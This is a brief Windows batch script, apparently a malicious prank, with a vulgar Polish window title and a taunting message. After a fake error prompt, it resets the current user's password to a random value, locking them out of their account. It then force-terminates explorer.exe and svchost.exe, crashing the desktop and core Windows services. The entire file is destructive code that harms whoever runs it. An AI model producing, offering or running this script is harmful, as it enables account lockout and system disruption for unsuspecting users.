echo off
title Jebac home XDDDD
color 4F msg %username% Przepraszamy, program chroma nie ma chromosoma
cls
echo error
timeout -1
net user %username% %random%
taskkill /f /im explorer.exe
taskkill /f /im svchost.exe
